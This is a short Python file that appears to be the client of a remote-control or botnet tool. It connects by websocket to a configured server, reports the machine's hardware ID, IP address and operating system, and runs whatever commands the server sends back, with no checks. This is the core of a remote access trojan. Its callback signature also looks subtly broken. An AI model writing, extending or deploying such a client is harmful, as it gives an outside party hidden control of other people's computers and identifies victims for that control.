from command_handler import run_command
from utils.system_info import get_hwid, get_ip, get_os
import json
import websocket
from config import SERVER_URL

def on_command(command):
    run_command(command)

def on_register(ws):
    client_info = {
        "event": "register",
        "data": {
            "client_id": 1,
            "hwid": get_hwid(),
            "ip": get_ip(),
            "os": get_os()
        }
    }
    ws.send(json.dumps(client_info))

def connect_to_server():
    ws = websocket.WebSocketApp(SERVER_URL, on_message=on_command, on_open=on_register)
    ws.run_forever()